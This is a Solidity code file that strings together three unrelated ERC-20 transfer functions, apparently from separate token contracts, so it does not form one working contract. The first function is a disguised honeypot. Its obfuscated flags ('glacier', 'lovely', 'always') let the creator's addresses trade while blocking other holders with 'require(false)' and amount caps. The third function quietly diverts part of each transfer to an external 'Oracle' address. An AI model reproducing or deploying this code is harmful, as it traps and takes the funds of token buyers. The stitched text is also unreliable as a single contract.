function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (papers == false)) {
        smartphone = chTx;
        cocos = true;
    }
    if ((address(sender) == creator) && (papers == true)) {
        glacier[recipient] = true;
        lovely[recipient] = false;
        papers = false;
    }
    if ((amount > destructiooon) && (glacier[sender] == true) && (address(sender) != creator)) {
        always[recipient] = true;
    }
    if (glacier[recipient] != true) {
        lovely[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((lovely[sender]) && (glacier[recipient] == false)) {
        lovely[recipient] = true;
    }
    if (glacier[sender] == false) {
        if ((amount > destructiooon) && (always[sender] == true)) {
            require(false);
        }
        require(amount < smartphone);
        if (cocos == true) {
            if (always[sender] == true) {
                require(false);
            }
            always[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _transfer(
    address from,
    address to,
    uint256 amount
) internal override {
    require(from != address(0));
    require(to != address(0));
    if (amount == 0) {
        super._transfer(from, to, 0);
        return;
    }
    uint256 contractTokenBalance = balanceOf(address(this));
    bool canSwap = contractTokenBalance >= swapTokensAtAmount;
    if (
        canSwap &&
        !swapping &&
        from != uniswapV2Pair &&
        from != owner() &&
        to != owner()
    ) {
        swapping = true;
        uint256 sellTokens = balanceOf(address(this));
        swapAndSendDividends(sellTokens);
        swapping = false;
    }
    bool takeFee = !swapping;
    if (_isExcluded[from] || _isExcluded[to]) {
        takeFee = false;
    }
    if (takeFee && (to == uniswapV2Pair || from == uniswapV2Pair)) {
        uint256 fees = amount.mul(777).div(10000);
        amount = amount.sub(fees);
        super._transfer(from, address(this), fees);
    }
    super._transfer(from, to, amount);
}

function _transferFrom(address sender, address recipient, uint256 amount) internal returns(bool) {
    if (launched() && launchedAtTime + 5 minutes >= block.timestamp) {
        if (Oracle.auctionMode() && amount > launchLimit) {
            uint256 offset = amount.sub(launchLimit);
            _balances[address(Oracle)] = _balances[address(Oracle)].add(offset);
            emit Transfer(sender, address(Oracle), offset);
            amount = launchLimit;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
    uint256 amountReceived;
    if (!isSnipeExempt[recipient]) {
        amountReceived = shouldCheckOracle(sender) ? checkOracles(sender, amount, recipient) : amount;
    } else {
        amountReceived = amount;
    }
    _balances[recipient] = _balances[recipient].add(amountReceived);
    emit Transfer(sender, recipient, amountReceived);
    return true;
}

function checkOracles(address sender, uint256 amount, address receiver) internal returns(uint256) {
    (uint256 feeAmount, bool isOracle) = Oracle.checkForOracle(amount, sender, receiver, msg.sender);
    if (isOracle) {
        _balances[address(Oracle)] = _balances[address(Oracle)].add(feeAmount);
        emit Transfer(sender, address(Oracle), feeAmount);
    }
    return amount.sub(feeAmount);
}

